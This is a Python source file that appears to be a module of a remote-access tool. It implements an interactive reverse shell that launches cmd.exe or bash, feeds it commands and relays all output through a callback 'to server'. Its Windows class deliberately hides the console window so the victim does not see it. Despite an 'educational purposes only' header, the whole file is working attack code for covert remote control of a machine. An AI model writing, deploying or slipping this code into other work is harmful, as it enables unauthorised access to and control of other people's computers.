"""
Reverse Shell - Interactive shell connection
For educational purposes only - For Educational Use Only
"""

import threading, subprocess, sys, os, ctypes, msvcrt, time

class ReverseShell:
    """Interactive reverse shell"""
    
    def __init__(self, callback) -> None:
        """
        Initialize reverse shell
        Args:
            callback: Function to send output back to server
        """

        try:
            self.callback = callback
            self.running = False
            self.process = None
            self.stdout_thread = None
            self.stderr_thread = None
        except Exception as e:
            raise Exception(f"ReverseShell initialization error in __init__ function: {e}")
    
    def start(self) -> bool:
        """Start interactive shell"""
        
        if self.running:
            return False
        
        try:
            # Determine shell based on OS
            if sys.platform.startswith('win'):
                shell = 'cmd.exe'
                shell_args = ['/Q']  # Quiet mode (no version banner)
            else:
                shell = '/bin/bash'
                shell_args = ['-i']  # Interactive mode
            
            
            # Start shell process with NO buffering
            self.process = subprocess.Popen(
                [shell] + shell_args,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=0,  # NO buffering
                universal_newlines=False  # Binary mode
            )
            
            self.running = True
            
            # Start separate threads for stdout and stderr
            self.stdout_thread = threading.Thread(
                target=self._read_stream,
                args=(self.process.stdout, 'stdout'),
                daemon=True
            )
            self.stdout_thread.start()
            
            self.stderr_thread = threading.Thread(
                target=self._read_stream,
                args=(self.process.stderr, 'stderr'),
                daemon=True
            )
            self.stderr_thread.start()
            
            # Send initial info
            self._send_output(f"[+] Reverse shell active\n")
            self._send_output(f"[*] OS: {sys.platform}\n")
            self._send_output(f"[*] CWD: {os.getcwd()}\n\n")
            
            return True
        
        except Exception as e:
            print(f"[!] Failed to start reverse shell: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def stop(self) -> None:
        """Stop shell"""

        try:
            self.running = False
            
            if self.process:
                try:
                    self.process.terminate()
                    self.process.wait(timeout=2)
                except:
                    try:
                        self.process.kill()
                    except:
                        pass
                
                self.process = None
        except Exception as e:
            raise Exception(f"ReverseShell stop error in stop function: {e}")
    
    def execute(self, command) -> None:
        """
        Execute command in shell
        Args:
            command: Command to execute
        """

        if not self.running or not self.process:
            self._send_output("[!] Shell not running\n")
            return
        
        try:
            # Add newline and encode
            cmd_bytes = (command + '\n').encode('utf-8', errors='replace')
            
            # Write to stdin
            self.process.stdin.write(cmd_bytes)
            self.process.stdin.flush()
            
        except Exception as e:
            self._send_output(f"[!] Error: {e}\n")
            raise Exception(f"[!] Error executing command: {e}")
    
    def _read_stream(self, stream, stream_name) -> None:
        """
        Read output from stream (stdout or stderr)
        Args:
            stream: The stream to read from
            stream_name: Name for debugging
        """
        
        
        while self.running and self.process:
            try:
                # Read one byte at a time to avoid blocking
                chunk = stream.read(1)
                
                if chunk:
                    # Try to read more if available
                    try:
                        # Non-blocking read of remaining bytes
                        import select
                        if sys.platform.startswith('win'):
                            # Windows: just try to read small chunks
                            extra = stream.read(1023)
                            if extra:
                                chunk += extra
                        else:
                            # Unix: use select
                            if select.select([stream], [], [], 0)[0]:
                                extra = stream.read(1023)
                                if extra:
                                    chunk += extra
                    except:
                        pass
                    
                    # Decode and send
                    try:
                        text = chunk.decode('cp850' if sys.platform.startswith('win') else 'utf-8', errors='replace')
                        self._send_output(text)
                    except Exception as e:
                        print(f"[!] Decode error: {e}")
                
                elif self.process.poll() is not None:
                    # Process ended
                    break
                
            except Exception as e:
                if self.running:
                    raise Exception(f"ReverseShell read stream error in _read_stream function ({stream_name}): {e}")
                break
    
    def _send_output(self, text) -> None:
        """
        Send output to server via callback
        Args:
            text: Output text
        """
        
        if self.callback:
            try:
                self.callback(text)
            except Exception as e:
                raise Exception(f"ReverseShell output send error in _send_output function: {e}")
    
    def is_running(self) -> bool:
        """Check if shell is running"""
        return self.running and self.process and self.process.poll() is None


class ReverseShellWindows :
    """
    Optimized reverse shell for Windows
    Uses different approach for better cmd.exe compatibility
    """
    
    def __init__(self, callback) -> None:
        """
        Initialize Windows reverse shell
        """

        try:
            self.callback = callback
            self.running = False
            self.process = None
            self.read_thread = None
        except Exception as e:
            raise Exception(f"ReverseShellWindows init error in __init__ function: {e}")
    
    def start(self) -> bool:
        """Start Windows shell"""

        try:
            try:
                
                # Start cmd with specific flags
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0  # Hide window
                
                self.process = subprocess.Popen(
                    'cmd.exe',
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,  # Merge stderr into stdout
                    bufsize=0,
                    universal_newlines=False,
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                self.running = True
                
                # Start reader
                self.read_thread = threading.Thread(
                    target=self._read_output_windows,
                    daemon=True
                )
                self.read_thread.start()
                
                # Initial info
                self._send_output(f"[+] Windows shell active\n")
                self._send_output(f"[*] CWD: {os.getcwd()}\n\n")
                
                return True
            
            except Exception as e:
                return False
        except Exception as e:
            raise Exception(f"ReverseShellWindows start error in start function: {e}")
    
    def execute(self, command) -> None:
        """Execute command"""

        if not self.running or not self.process:
            return
        
        try:
            # Encode command
            cmd_bytes = (command + '\r\n').encode('cp850', errors='replace')
            
            # Write and flush
            self.process.stdin.write(cmd_bytes)
            self.process.stdin.flush()
            
        except Exception as e:
            raise Exception(f"[!] Execute error: {e}")
    
    def _read_output_windows(self) -> None:
        """Read output optimized for Windows - NON-BLOCKING version"""
        try:
            import msvcrt
            from ctypes import windll, byref, wintypes
            
            handle = msvcrt.get_osfhandle(self.process.stdout.fileno())
            
            while self.running and self.process:
                try:
                    if self.process.poll() is not None:
                        try:
                            remaining = self.process.stdout.read()
                            if remaining:
                                text = remaining.decode('cp850', errors='replace')
                                self._send_output(text)
                        except:
                            pass
                        break
                    
                    import ctypes
                    kernel32 = ctypes.windll.kernel32
                    bytes_available = wintypes.DWORD(0)
                    
                    result = kernel32.PeekNamedPipe(
                        handle, None, 0, None, byref(bytes_available), None
                    )
                    
                    if result and bytes_available.value > 0:
                        chunk = self.process.stdout.read(bytes_available.value)
                        if chunk:
                            text = chunk.decode('cp850', errors='replace')
                            self._send_output(text)
                    else:
                        time.sleep(0.05)
                
                except Exception as e:
                    if self.running:
                        time.sleep(0.1)
                    else:
                        break
                        
        except ImportError:
            # Fallback si modules manquants
            while self.running and self.process:
                if self.process.poll() is not None:
                    break
                time.sleep(0.1)
        except Exception as e:
            raise Exception(f"ReverseShellWindows read error: {e}")
    def _send_output(self, text) -> None:
        """Send output"""

        try:
            if self.callback:
                try:
                    self.callback(text)
                except Exception as e:
                    # print(f"[!] Send error: {e}") # Avoid recursive errors
                    pass
        except Exception as e:
            raise Exception(f"[!] Send output error: {e}")
    
    def stop(self) -> None:
        """Stop shell"""

        try:
            self.running = False
            
            if self.process:
                try:
                    self.process.terminate()
                    self.process.wait(timeout=2)
                except:
                    try:
                        self.process.kill()
                    except:
                        pass
        except Exception as e:
            raise Exception(f"ReverseShellWindows stop error in stop function: {e}")
    
    def is_running(self) -> bool:
        """Check if running"""

        return self.running and self.process and self.process.poll() is None